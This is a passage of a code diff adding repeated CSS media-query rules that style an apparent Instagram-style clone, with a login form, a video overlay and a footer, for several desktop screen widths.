+    
+
+
+}
+
+
+
+/* Desktop  videos  */
+  @media (min-width: 1024px) and (max-width: 1279px) {
+    i.up , i.dow{
+        height:50px;
+        width:50px;
+        background:rgb(58, 57, 57);
+        color:white;
+        border-radius:50%;
+         display:flex;
+        align-items:center;
+        justify-content:center; 
+        /* flex-direction:column; */
+        margin-top:20px;
+        transform:rotate(90deg);
+        /* text-align:center; */
+    }
+
+
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:60px;
+        left:15%;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        height:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:5%;
+   right:32%;
+   font-size:14px;
+   color:rgb(217, 217, 217);
+}
+div.video div.collection div{
+    margin-top:25px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    height:auto;
+    width:30px;
+
+}
+div.video div.collection div i{
+    font-size:25px;
+    cursor:pointer;
+    margin-top:10px;
+}
+div.video div.collection div p{
+    margin-top:6px;
+
+}
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
+}
+
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
+    /* display:none; */
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    display:none;
+}
+
+
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
+    /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        height: 96vh;
+        width:100%;
+        background-color:gray;
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
+    /* text-align:center; */
+}
+
+
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        height:inherit;
+        width:43%;
+        background:rgb(28, 29, 28);
+        border-left:2px solid rgb(110, 107, 107);
+        background:rgb(34, 33, 33);
+               background:rgb(28, 29, 28);
+
+    }
+
+    div.formbox{
+        /* border:2px solid white; */
+        width:550px;
+        height:auto;
+        margin:0px auto;
+        margin-top:97px;
+    }
+    div.formbox p.logintxt{
+        font-size:20px;
+        color:white;
+        font-family:initial;
+        font-family:'Franklin Gothic Medium', 'Arial Narrow', ;
+        font-weight:500;
+        /* display:none; */
+    }
+
+    form img.instalogoleft{
+        display:none;
+    }
+
+
+form div.emailinput{
+        width:100%;
+        height:58px;
+        margin-top:20px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.email{
+       width:100%;
+        height:58px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:18px;
+    }
+    div.emailinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:16px;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+    div.emailinput span{
+        display:none;
+    }
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:100%;
+        height:58px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  /* color: #e4e3e3; */
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+       width:100%;
+        height:58px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:18px;
+         letter-spacing:0.8px;
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:16px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
+    } */
+    
+
+    img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+    }
+    input.login{
+        width:100%;
+        height:44px;
+        margin-top:22px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:17px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        cursor:not-allowed;
+    }
+    input.login:hover{
+         background:rgb(25, 121, 239);
+    }
+    button.forget{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:15px;
+        background:rgb(38, 36, 36);
+        background:transparent;
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        border:none;
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        font-weight:400;
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle;
+        border:none;
+    }
+
+    button.cracc{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:10px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        letter-spacing:1px;
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
+
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:22px;
+    }
+
+
+
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
+
+footer{
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+}
+footer ul.footerul{
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
+}
+footer ul.footerul li{
+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
+}
+footer ul.footerul li:hover{
+    border-bottom:0.3px solid gray;
+}
+
+    }
+@media (min-width: 1280px) and (max-width: 1439px) {
+    i.up , i.dow{
+        height:50px;
+        width:50px;
+        background:rgb(58, 57, 57);
+        color:white;
+        border-radius:50%;
+         display:flex;
+        align-items:center;
+        justify-content:center; 
+        /* flex-direction:column; */
+        margin-top:20px;
+        transform:rotate(90deg);
+        /* text-align:center; */
+    }
+
+
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:60px;
+        left:15%;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        height:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:5%;
+   right:32%;
+   font-size:14px;
+   color:rgb(217, 217, 217);
+}
+div.video div.collection div{
+    margin-top:25px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    height:auto;
+    width:30px;
+
+}
+div.video div.collection div i{
+    font-size:25px;
+    cursor:pointer;
+    margin-top:10px;
+}
+div.video div.collection div p{
+    margin-top:6px;
+
+}
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
+}
+
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
+    /* display:none; */
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    display:none;
+}
+
+
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
+    /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        height: 96vh;
+        width:100%;
+        background-color:gray;
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
+    /* text-align:center; */
+}
+
+
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        height:inherit;
+        width:43%;
+        background:rgb(28, 29, 28);
+        border-left:2px solid rgb(110, 107, 107);
+        background:rgb(34, 33, 33);
+               background:rgb(28, 29, 28);
+
+    }
+
+    div.formbox{
+        /* border:2px solid white; */
+        width:550px;
+        height:auto;
+        margin:0px auto;
+        margin-top:97px;
+    }
+    div.formbox p.logintxt{
+        font-size:20px;
+        color:white;
+        font-family:initial;
+        font-family:'Franklin Gothic Medium', 'Arial Narrow', ;
+        font-weight:500;
+        /* display:none; */
+    }
+
+    form img.instalogoleft{
+        display:none;
+    }
+
+
+form div.emailinput{
+        width:100%;
+        height:58px;
+        margin-top:20px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.email{
+       width:100%;
+        height:58px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:18px;
+    }
+    div.emailinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:16px;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:100%;
+        height:58px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  /* color: #e4e3e3; */
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+       width:100%;
+        height:58px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:18px;
+         letter-spacing:0.8px;
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:16px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
+    } */
+    
+
+    img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+    }
+    input.login{
+        width:100%;
+        height:44px;
+        margin-top:22px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:17px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        cursor:not-allowed;
+    }
+    input.login:hover{
+         background:rgb(25, 121, 239);
+    }
+    button.forget{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:15px;
+        background:rgb(38, 36, 36);
+        background:transparent;
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        border:none;
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        font-weight:400;
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle;
+        border:none;
+    }
+
+    button.cracc{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:10px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        letter-spacing:1px;
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
+
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:22px;
+    }
+
+
+
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
+
+footer{
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+}
+footer ul.footerul{
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
+}
+footer ul.footerul li{
+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
+}
+footer ul.footerul li:hover{
+    border-bottom:0.3px solid gray;
+}
+
+    }
+@media(min-width:1440px ) and ( max-width: 1940px) {
+    i.up , i.dow{
+        height:50px;
+        width:50px;
+        background:rgb(58, 57, 57);
+        color:white;
+        border-radius:50%;
+         display:flex;
+        align-items:center;
+        justify-content:center; 
+        /* flex-direction:column; */
+        margin-top:20px;
+        transform:rotate(90deg);
+        /* text-align:center; */
+    }
+
+
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:60px;
+        left:15%;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        height:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:5%;
+   right:32%;
+   font-size:14px;
+   color:rgb(217, 217, 217);
+}
+div.video div.collection div{
+    margin-top:25px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    height:auto;
+    width:30px;
+
+}
+div.video div.collection div i{
+    font-size:25px;
+    cursor:pointer;
+    margin-top:10px;
+}
+div.video div.collection div p{
+    margin-top:6px;
+
+}
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
+}
+
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
+    /* display:none; */
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    display:none;
+}
+
+
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
+    /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        height: 96vh;
+        width:100%;
+        background-color:gray;
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
+    /* text-align:center; */
+}
+
+
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        height:inherit;
+        width:43%;
+        background:rgb(28, 29, 28);
+        border-left:2px solid rgb(110, 107, 107);
+        background:rgb(34, 33, 33);
+               background:rgb(28, 29, 28);
+
+    }
+
+    div.formbox{
+        /* border:2px solid white; */
+        width:550px;
+        height:auto;
+        margin:0px auto;
+        margin-top:97px;
+    }
+    div.formbox p.logintxt{
+        font-size:20px;
+        color:white;
+        font-family:initial;
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:500;
+        /* display:none; */
+    }
+
+    form img.instalogoleft{
+        display:none;
+    }
+    div.formbox form p.enguk{
+        display:none;
+    }
+
+
+form div.emailinput{
+        width:100%;
+        height:58px;
+        margin-top:20px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.email{
+       width:100%;
+        height:58px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:18px;
+    }
+    div.emailinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:16px;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+    div.emailinput span{
+        display:none;
+    }
+
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:100%;
+        height:58px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  color: white;
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+       width:100%;
+        height:58px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:18px;
+         letter-spacing:0.8px;
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:16px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
+    } */
+    
+
+    img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+    }
+    input.login{
+        width:100%;
+        height:44px;
+        margin-top:22px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:17px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        cursor:not-allowed;
+    }
+    input.login:hover{
+         background:rgb(25, 121, 239);
+    }
+    button.forget{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:15px;
+        background:rgb(38, 36, 36);
+        background:transparent;
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        border:none;
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        font-weight:400;
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle;
+        border:none;
+    }
+
+    button.cracc{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:17px;
+        width:100%;
+        height:44px;
+        margin-top:10px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        letter-spacing:1px;
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
+
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:22px;
+    }
+
+
+
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
+
+footer{
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+}
+footer ul.footerul{
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
+}
+footer ul.footerul li{
